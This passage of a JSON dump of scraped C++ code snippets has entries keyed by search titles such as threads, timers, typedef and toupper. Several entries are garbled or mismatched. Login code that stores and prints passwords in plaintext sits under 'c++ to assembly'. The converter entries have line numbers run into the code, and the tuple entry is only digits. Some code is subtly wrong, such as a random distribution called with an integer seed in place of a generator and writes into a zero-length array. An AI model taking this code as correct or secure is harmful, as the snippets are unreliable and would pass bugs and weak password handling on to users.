    "description": "<condition> ? <true-case-code> : <false-case-code>; \n(n1 > n2) ? n1 : n2;              OR n1 > n2 ? n1 : n2;\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1273,
    "keyword": null,
    "link": null,
    "title": " c++ ternary operator vs if else",
    "description": "#include <iostream>  using namespace std;  int main() {  // METHOD 1 USING AN IF STATEMENT     cout << \"*******************************\" << endl;     cout << \"Method 1 using the if statement\" << endl;     cout << \"*******************************\" << endl;     for (int i {1}; i <= 100; i++){         cout << i;         if (i % 10 == 0){             cout << endl;         }else {             cout << \" \";         }     }     cout << \"\\n\" << endl; // METHOD 2 USING THE TERNARY STATEMENT     cout << \"***********************************\" << endl;     cout << \"Method 2 using conditional operator\" << endl;     cout << \"***********************************\" << endl;     for(int b{1}; b <= 100; b++){     cout << b << ((b % 10 == 0) ? \"\\n\" : \" \");//condition ? doThisIfTrue : doThisIfFalse     }         return 0; }\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1274,
    "keyword": null,
    "link": null,
    "title": " c++ ternary statement",
    "description": "x = condition ? expression1 : expression2  // Example: double x = 1 > 0 ? 10 : 20; // put any value\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1275,
    "keyword": null,
    "link": null,
    "title": " c++ thread",
    "description": "#include <thread> void foo()  {   // do stuff... } int main()  {   std::thread first (foo);   first.join(); }\n// thread example #include <iostream>       // std::cout #include <thread>         // std::thread   void foo()  {   // do stuff... }  void bar(int x) {   // do stuff... }  int main()  {   std::thread first (foo);     // spawn new thread that calls foo()   std::thread second (bar,0);  // spawn new thread that calls bar(0)    std::cout << \"main, foo and bar now execute concurrently...\\n\";    // synchronize threads:   first.join();                // pauses until first finishes   second.join();               // pauses until second finishes    std::cout << \"foo and bar completed.\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1276,
    "keyword": null,
    "link": null,
    "title": " c++ thread incide class",
    "description": "#include <iostream> #include <thread>  class foo { public:     void make_foo_func_thread()     {         t=std::thread(&foo::foo_func, this);         t.join();     }  private:     std::thread t;     void foo_func() { std::cout << \"Hello\\n\"; } };  int main() {     foo f;     f.make_foo_func_thread(); } \n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1277,
    "keyword": null,
    "link": null,
    "title": " c++ throw exception",
    "description": "#include <stdexcept>  int compare( int a, int b ) {     if ( a < 0 || b < 0 ) {         throw std::invalid_argument( \"received negative value\" );     } }\n//throw \"throws\" an exception.    It is usually used like:  if(something isnt right){   throw somethingee; }  /*(std::)*/cout << somethingee;\n#include <stdexcept> #include <limits> #include <iostream>  using namespace std;  void MyFunc(int c) {     if (c > numeric_limits< char> ::max())         throw invalid_argument(\"MyFunc argument too large.\");     //... }\n// using standard exceptions #include <iostream> #include <exception> using namespace std;  class myexception: public exception {   virtual const char* what() const throw()   {     return \"My exception happened\";   } } myex;  int main () {   try   {     throw myex;   }   catch (exception& e)   {     cout << e.what() << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1278,
    "keyword": null,
    "link": null,
    "title": " c++ time nanoseconds",
    "description": "#include <iostream> #include <chrono>  int main() {     auto start = std::chrono::high_resolution_clock::now();     // operation to be timed ...     auto finish = std::chrono::high_resolution_clock::now();     auto time_in_nanoseconds =  std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count(); } \n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1279,
    "keyword": null,
    "link": null,
    "title": " c++ timer",
    "description": "# include <windows.h> # include <iostream> using namespace std;  void timer(int sec) {     Sleep(sec*1000); }  int main() {     cout << \"Wait 5 seconds \" << endl;     timer(5);     cout << \"FireWorks !\" << endl;      return 0; }\n#include <iostream> #include <chrono>  // This is how to measure the time it takes functions to finish  long add(int a, int b) { \treturn a + b; }  int main() { \tauto start = std::chrono::steady_clock::now(); \tstd::cout << \"9 + 10 = \" << add(9, 10) << '\\n'; \tauto end = std::chrono::steady_clock::now(); \tstd::chrono::duration<double> elapsed_seconds = end - start; \tstd::cout << \"elapsed time to compute 9 + 10: \" << elapsed_seconds.count() << \"s\\n\"; \treturn 0; }\n// CPP program to create a timer  #include <iomanip>  #include <iostream>  #include <stdlib.h>  #include <unistd.h>  using namespace std;   // hours, minutes, seconds of timer  int hours = 0;  int minutes = 0;  int seconds = 0;   // function to display the timer  void displayClock()  {  \t// system call to clear the screen  \tsystem(\"clear\");   \tcout << setfill(' ') << setw(55) << \"\t\t TIMER\t\t \\n\";  \tcout << setfill(' ') << setw(55) << \" --------------------------\\n\";  \tcout << setfill(' ') << setw(29);  \tcout << \"| \" << setfill('0') << setw(2) << hours << \" hrs | \";  \tcout << setfill('0') << setw(2) << minutes << \" min | \";  \tcout << setfill('0') << setw(2) << seconds << \" sec |\" << endl;  \tcout << setfill(' ') << setw(55) << \" --------------------------\\n\";  }   void timer()  {  \t// infinte loop because timer will keep  \t// counting. To kill the process press  \t// Ctrl+D. If it does not work ask  \t// ubuntu for other ways.  \twhile (true) {  \t\t \t\t// display the timer  \t\tdisplayClock();   \t\t// sleep system call to sleep  \t\t// for 1 second  \t\tsleep(1);   \t\t// increment seconds  \t\tseconds++;   \t\t// if seconds reaches 60  \t\tif (seconds == 60) {  \t\t \t\t\t// increment minutes  \t\t\tminutes++;   \t\t\t// if minutes reaches 60  \t\t\tif (minutes == 60) {  \t\t \t\t\t\t// increment hours  \t\t\t\thours++;  \t\t\t\tminutes = 0;  \t\t\t}  \t\t\tseconds = 0;  \t\t}  \t}  }   // Driver Code  int main()  {  \t// start timer from 00:00:00  \ttimer();  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1280,
    "keyword": null,
    "link": null,
    "title": " c++ to assembly",
    "description": "$ gcc -S geeks.c \n #include <iostream> using namespace std;  int main() {         int number;      cout << \"Enter an integer: \";     cin >> number;      cout << \"You entered \" << number;         return 0; }\n  #include<iostream> #include<fstream> using namespace std;   struct mail {     char un[50];             // user name     char pd[50];             // passsword     void reg(int); } obj[5];   void mail::reg(int k) {     int i=k;     cout<<\"\\nEnter user name :: \";     cin>>un;     cout<<\"\\nEnter password :: \";     cin>>pd;       ofstream filout;     filout.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::app|ios::binary);     if(!filout)     {         cout<<\"\\nCannot open file\\n\";     }     else     {         cout<<\"\\n\";         filout.write((char *)&obj[i],sizeof(mail));         filout.close();     }       cout<<\"\\n...........You are now registered.......... \\n\\n\";   }   // end of sign up or register func   int main() {     int t;     cout<<\"\\nEnter Registration Details for User 1 :: \\n\";     obj[0].reg(0);     cout<<\"\\nEnter Registration Details for User 2 :: \\n\";     obj[1].reg(1);     cout<<\"\\nEnter Registration Details for User 3 :: \\n\";     obj[2].reg(2);       mail obj2;       ifstream filein;     filein.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::in|ios::binary);     if(!filein)     {         cout<<\"\\nUnable to open file to read\\n\";     }     else     {         cout<<\"\\nRegistered Details of All Users :: \\n\";         filein.read((char *)&obj2,sizeof(obj2));         while(filein)         {             cout<<\"\\nUsername :: \"<<obj2.un<<\"\\nPasswword :: \"<<obj2.pd<<\"\\n\";             filein.read((char *)&obj2,sizeof(obj2));         }             //filein.close();     }         return 0; } }  \n   #include<iostream> #include<fstream> using namespace std;   struct mail {     char un[50];             // user name     char pd[50];             // passsword     void reg(int); } obj[5];   void mail::reg(int k) {     int i=k;     cout<<\"\\nEnter user name :: \";     cin>>un;     cout<<\"\\nEnter password :: \";     cin>>pd;       ofstream filout;     filout.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::app|ios::binary);     if(!filout)     {         cout<<\"\\nCannot open file\\n\";     }     else     {         cout<<\"\\n\";         filout.write((char *)&obj[i],sizeof(mail));         filout.close();     }       cout<<\"\\n...........You are now registered.......... \\n\\n\";   }   // end of sign up or register func   int main() {     int t;     cout<<\"\\nEnter Registration Details for User 1 :: \\n\";     obj[0].reg(0);     cout<<\"\\nEnter Registration Details for User 2 :: \\n\";     obj[1].reg(1);     cout<<\"\\nEnter Registration Details for User 3 :: \\n\";     obj[2].reg(2);       mail obj2;       ifstream filein;     filein.open(\"C:\\\\Users\\\\acer\\\\Documents\\\\registration.txt\",ios::in|ios::binary);     if(!filein)     {         cout<<\"\\nUnable to open file to read\\n\";     }     else     {         cout<<\"\\nRegistered Details of All Users :: \\n\";         filein.read((char *)&obj2,sizeof(obj2));         while(filein)         {             cout<<\"\\nUsername :: \"<<obj2.un<<\"\\nPasswword :: \"<<obj2.pd<<\"\\n\";             filein.read((char *)&obj2,sizeof(obj2));         }             //filein.close();     }         return 0; } \n#include <iostream> #include <fstream>  using namespace std;  #define FILENAME \"data.bin\"  void what_action();  void register_menu(); void login_menu();  void add_user(string username, string password); bool check_user(string username, string password);  int main() {     what_action(); }  void what_action() {     short int input;      cout << \"1. Login\\n2. Register\" << endl;     cin >> input;      switch(input)     {         case 1:         login_menu();         break;          case 2:         register_menu();         break;          default:         cout << \"Type Again!\" << endl;;         what_action();         break;     } }  void register_menu() {     string user, pw;     int agree;          cout << \"Username: \";     cin >> user;          cout << \"Password: \";     cin >> pw;      cout << \"Have You Read our Agreement ? ( 1 = yes )\";     cin >> agree;      switch(agree)     {         case 1:         add_user(user, pw);         break;          default:         cout << \"Please Read our Agreement First !\" << endl;          register_menu();         break;     } }  void login_menu() {     string user, pw;          cout << \"Username: \";     cin >> user;          cout << \"Password: \";     cin >> pw;      if(check_user(user, pw) == true)         cout << \"you have logged in succefully !\" << endl;     else         cout << \"Data is Wrong!\" << endl; }  void add_user(string username, string password) {     ofstream file;     file.open(FILENAME, ios_base::app);      file << username << \"\\n\";     file << password << \"\\n\";      file.close(); }  bool check_user(string username, string password) {     ifstream file;      string line;     bool what_to_return;      file.open(FILENAME, ios_base::binary);      if(file.is_open())     {         while(getline(file, line))         {             string usr, pw;              usr = line;              getline(file,line);              pw = line;              if(usr == username && password == pw)             {                 what_to_return = true;                 break;             }             else                 what_to_return = false;         }     }      return what_to_return; }\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1281,
    "keyword": null,
    "link": null,
    "title": " c++ to c converter",
    "description": "#include<bits/stdc++.h>  using namespace std;  void testfun(map<string, int> mp){     map<string, int>::iterator it = mp.begin();     for(; it!=mp.end(); it++){         cout<<it->first<<\":\"<<it->second<<\" \";     }     cout<<endl; }  int main() {     int no, add=0;     cin>>no;     int var;     cin>>var;     map<string, int> d, h;     h[\"F\"] = 0;     while(var--){         string naam;         int a, b;         cin>>naam>>a>>b;         d[naam] = b/a;         h[naam] = b;         add+=b;     }     cin>>var;     while(var--){         string naam, c1=\"\", c2=\"\";         cin>>naam;         int meflux=0;         while(meflux<naam.length()){             if(naam[meflux]=='_'){                 c1 = c2;                 c2 = \"\";                 meflux++;                 continue;             }             c2+=naam[meflux++];         }         h[c2]+= h[c1];     }     //print(days);     //print(storage);     map<string, int>::reverse_iterator a= d.rbegin();     int multiply = 1;     for(; a!=d.rend(); a++ ){         int temperature = a->second*multiply;         if(temperature<no){             add+=(h[a->first]*(no-temperature));             multiply++;         }     }     cout<<add; }\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1282,
    "keyword": null,
    "link": null,
    "title": " c++ to c converter online",
    "description": "#include <stdio.h> #include <stdlib.h>  int main (void){ \tint vetor [2]; \tint *v; // ponteiro \tv = vetor; \tv[0] = 123; \tv[1] = 456; \tprintf (\"vetor[0] = %d\\n\", vetor[0]); \tprintf (\"vetor[1] = %d\\n\\n\", vetor[1]); \tsystem (\"pause\"); }\n123456789101112#include <stdio.h>#if !defined (MESSAGE)#define MESSAGE \"You wish!\"#endifint main(void){cout << \"Hello World\" << endl;return 0;}X\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n    string word;\n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1283,
    "keyword": null,
    "link": null,
    "title": " c++ to mips assembly converter",
    "description": "g=h+A[8]\n# Not sure what to do now? Enter your mips code here \n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1284,
    "keyword": null,
    "link": null,
    "title": " c++ to mips converter online",
    "description": "#include <iostream>    using namespace std;    int main()  {      int i,arr[10],sum=0;        cout<<\"Enter 10 elements:\";      for(i=0;i<10;++i)          cin>>arr[i];        for(i=0;i<10;++i)          sum=sum+arr[i];      cout<<\"Sum of numbers is:\"<<sum;        return 0;  }\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1285,
    "keyword": null,
    "link": null,
    "title": " c++ toupper string",
    "description": "transform(str.begin(), str.end(), str.begin(), ::toupper); \nstd::string data = \"This is a sample string.\"; // convert string to upper case std::for_each(data.begin(), data.end(), [](char & c){ c = ::toupper(c); });\nint result = toupper(charecterVariable);// return the int that corresponding upper case char //if there is none then it will return the int for the original input. //can convert int to char after char result2 = (char)toupper(variableChar);\n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The uppercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(toupper(str[i]));          return 0; }\n// toupper example (C++) #include <iostream>       // std::cout #include <string>         // std::string #include <locale>         // std::locale, std::toupper  int main () {   std::locale loc;   std::string str=\"Test String.\\n\";   for (std::string::size_type i=0; i<str.length(); ++i)     std::cout << std::toupper(str[i],loc);   return 0; }  /* Output: TEST STRING. */\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1286,
    "keyword": null,
    "link": null,
    "title": " c++ triple",
    "description": "#include <tuple>  std::tuple<int, int, int> three;  std::get<0>( three) = 0; std::get<1>( three) = 1; std::get<2>( three) = 2;\n",
    "reg_date": "2021-10-12T11:38:45.000Z"
  },
  {
    "id": 1287,
    "keyword": null,
    "link": null,
    "title": " c++ try",
    "description": "try { \t//do } catch (...){ \t//if error do }\n// exceptions #include <iostream> using namespace std;  int main () {   try   {     throw 20;   }   catch (int e)   {     cout << \"An exception occurred. Exception Nr. \" << e << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1288,
    "keyword": null,
    "link": null,
    "title": " c++ tuple",
    "description": "12345678910111213141516\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1289,
    "keyword": null,
    "link": null,
    "title": " c++ tuto",
    "description": "#include <iostream> #include <string> #include <tuple>  struct Personne {     std::string nom;     std::string prenom;     int age; };  Personne f() {     return { \"Lagrume\", \"Clem\", 4 }; }  int main() {     auto[nom, prenom, age] = f();     std::cout << \"Voici \" << prenom << \" \" << nom << \" et elle a \" << age << \" ans.\" << std::endl;     return 0; } \n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1290,
    "keyword": null,
    "link": null,
    "title": " c++ two array find same values",
    "description": "#include <iostream> #include <cstdlib> #include <conio.h>   using namespace std; int main()  { int p[4] ,p1[4], num = 0 , p2[] = {}; cout<<\"Enter 4 numbers of the first array \"; for(int a=0;a<4;a++){ \tcin>>p[a]; }  system(\"CLS\"); cout<<\"Enter 4 numbers of the second array: \"; for(int a=0;a<4;a++){ \tcin>>p1[a]; }  system(\"CLS\");   for(int i = 0 ; i < 4; ++i) { for (int j = 0 ; j < 4; ++j) { \tif(p[i]==p1[j]) { \t\tp2[num++] = p[j]; } } }  \tcout<<\"The number of common elements\"<<num<<endl; \tcout<<\"These are the common numbers: \"; \tfor (int k=0;k<num;k++){ \t\tcout<<p2[k]<<\" \"; \t} \tgetch(); \treturn 0; \t }\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1291,
    "keyword": null,
    "link": null,
    "title": " c++ typedef",
    "description": "// typedef [type] [alias] // Example: typedef unsigned long int ulong;  ulong someNumber = 158426;\ntypedef int myint; \n#include <iostream>  int main(){ \ttypedef unsigned int ui; \tui i = 5, j = 8; \tstd::cout << \"i = \" << i << std::endl; \tstd::cout << \"j = \" << j << std::endl; \treturn 0; } \n// simple typedef typedef unsigned long ulong;   // the following two objects have the same type unsigned long l1; ulong l2;   // more complicated typedef typedef int int_t, *intp_t, (&fp)(int, ulong), arr_t[10];   // the following two objects have the same type int a1[10]; arr_t a2;   // common C idiom to avoid having to write \"struct S\" typedef struct {int a; int b;} S, *pS;   // the following two objects have the same type pS ps1; S* ps2;   // error: storage-class-specifier cannot appear in a typedef declaration // typedef static unsigned int uint;   // typedef can be used anywhere in the decl-specifier-seq long unsigned typedef int long ullong; // more conventionally spelled \"typedef unsigned long long int ullong;\"   // std::add_const, like many other metafunctions, use member typedefs template< class T> struct add_const {     typedef const T type; };   typedef struct Node {     struct listNode* next; // declares a new (incomplete) struct type named listNode } listNode; // error: conflicts with the previously declared struct name\ntypedef int tabla1N[N + 1];\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1292,
    "keyword": null,
    "link": null,
    "title": " c++ typedef array",
    "description": "// This will define a type named TYPE representing an array of 4 doubles   typedef double TYPE[4];\n#include <string> #include <typeinfo> #include <iostream>  using namespace std;  int main(int argc, char** argv) {     string str = \"string\";     cout << typeid(str).name();     return 0; }\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1293,
    "keyword": null,
    "link": null,
    "title": " c++ typedef template class",
    "description": "template<typename T> using MyVector = std::vector<T, MyCustomAllocator<T>>;  MyVector<int> x; // same as: std::vector<int, MyCustomAllocator<int>>\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1294,
    "keyword": null,
    "link": null,
    "title": " c++ typeid get type name",
    "description": "const std::type_info& ti1 = typeid(A); const std::type_info& ti2 = typeid(A);   assert(&ti1 == &ti2); // not guaranteed assert(ti1.hash_code() == ti2.hash_code()); // guaranteed assert(std::type_index(ti1) == std::type_index(ti2)); // guaranteed\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1295,
    "keyword": null,
    "link": null,
    "title": " c++ typeof",
    "description": "typeof (int *) \n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1296,
    "keyword": null,
    "link": null,
    "title": " c++ uint32 t",
    "description": "// uint32_t is a type definition for a 32 bit unsigned integer typedef unsigned int uint32_t  unsigned int myInt; // Same as uint32_t myInt;\n",
    "reg_date": "2021-10-12T11:38:46.000Z"
  },
  {
    "id": 1297,
    "keyword": null,
    "link": null,
    "title": " c++ uint8 t header",
    "description": "//The library/Header is called cstdint #include <cstdint>\n//The header/library is cstdint #include <cstdint>\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1298,
    "keyword": null,
    "link": null,
    "title": " c++ undefined reference to vtable",
    "description": "virtual ~BaseClass() { }; \n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1299,
    "keyword": null,
    "link": null,
    "title": " c++ uniform real distribution get same result",
    "description": "//don't use a time based seed, you could use std::random_device like this: // Create a random device and use it to generate a random seed std::random_device myRandomDevice; unsigned int seed = myRandomDevice(); //generate a random seed  std::uniform_real_distribution<double> dist(-1.0, 1.0); //will be from -1 to 1 double randomNumber = dist(seed); //now you get random numbers\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1300,
    "keyword": null,
    "link": null,
    "title": " c++ unittest in ros",
    "description": "// Bring in my package's API, which is what I'm testing #include \"foo/foo.h\" // Bring in gtest #include <gtest/gtest.h>  // Declare a test TEST(TestSuite, testCase1) { <test things here, calling EXPECT_* and/or ASSERT_* macros as needed> }  // Declare another test TEST(TestSuite, testCase2) { <test things here, calling EXPECT_* and/or ASSERT_* macros as needed> }  // Run all the tests that were declared with TEST() int main(int argc, char **argv){   testing::InitGoogleTest(&argc, argv);   ros::init(argc, argv, \"tester\");   ros::NodeHandle nh;   return RUN_ALL_TESTS(); }\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1301,
    "keyword": null,
    "link": null,
    "title": " c++ until",
    "description": "do {   //  whatever } while ( !condition );\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1302,
    "keyword": null,
    "link": null,
    "title": " c++ using boolean",
    "description": "bool isCodingFun = true; bool isFishTasty = false; cout << isCodingFun;  // Outputs 1 (true) cout << isFishTasty;  // Outputs 0 (false)  //credit to w3schools.com\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1303,
    "keyword": null,
    "link": null,
    "title": " c++ variable arguments",
    "description": "#include <iostream> #include <cstdarg> using namespace std;  double average(int num,...) {    va_list valist;               // A place to store the list of arguments (valist)    double sum = 0.0;    int i;        va_start(valist, num);        // Initialize valist for num number of arguments    for (i = 0; i < num; i++) {   // Access all the arguments assigned to valist       sum += va_arg(valist, int);    }    va_end(valist);               // Clean memory reserved for valist        return sum/num; }  int main() {    cout << \"[Average 3 numbers: 44,55,66] -> \" << average(3, 44,55,66) << endl;    cout << \"[Average 2 numbers: 10,11] -> \" << average(2, 10,11) << endl;     cout << \"[Average 1 number:  18] -> \" << average(1, 18) << endl;  }  /* NOTE: You will need to use the following 'data_types' within the function va_list   :  A place to store the list of arguments (valist) va_start  :  Initialize valist for num number of arguments va_arg    :  Access all the arguments assigned to valist va_end    :  Clean memory reserved for valist */\n#include <iostream>  // Define name_x_times() below: void name_x_times(std::string name, int x){ while(0 < x){   std::cout << name << \"\" } }  int main() {      std::string my_name = \"Add your name here!\";   int some_number = 5; // Change this if you like!   // Call name_x_times() below with my_name and some_number       } // this put shit inside of the shit, look back at your adventure.cpp code future me.\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1304,
    "keyword": null,
    "link": null,
    "title": " c++ variable globale",
    "description": "#include <iostream>  int global = 3; // Une variable globale  void ChangeGlobal() {    global = 5; // R&eacute;f&eacute;rence &agrave; la variable globale &agrave; l'int&eacute;rieur d'une fonction }  int main() {    std::cout << global << '\\n'; // R&eacute;f&eacute;rence &agrave; la variable globale dans une autre fonction    ChangeGlobal();    std::cout << global << '\\n';    return 0; } \n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1305,
    "keyword": null,
    "link": null,
    "title": " c++ variable type",
    "description": "std::string str = \"text\";\t// stores a string int    foo = 3;\t\t\t\t// stores any integer float  bar = 3.14;\t\t\t// stores 32 bit number double baz = 3.14159265;\t// stores 64 bit number\n// Example std::cout << \"Data-type = \" << typeid(YourVariable).name() << \"\\n\";    // Syntax typeid(YourVariable).name()\ntypedef unsigned int u_int; //giving 'unsigned int' a name of u_int\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1306,
    "keyword": null,
    "link": null,
    "title": " c++ vector.back",
    "description": "// vector::back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;    myvector.push_back(10);    while (myvector.back() != 0)   {     myvector.push_back ( myvector.back() -1 );   }    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size() ; i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\n#include <iostream> #include <vector>  int main() {   std::vector<int> myvector;      //add 2 to the back   myvector.push_back(2);      std::cout << myvector.back() << std::endl; //this will print 2      myvector.push_back(46);   std::cout << myvector.back() << std::endl; //prints 46      return 0;    }  /*Output 2 46 */\n",
    "reg_date": "2021-10-12T11:38:47.000Z"
  },
  {
    "id": 1307,
    "keyword": null,
    "link": null,
    "title": " c++ vector",
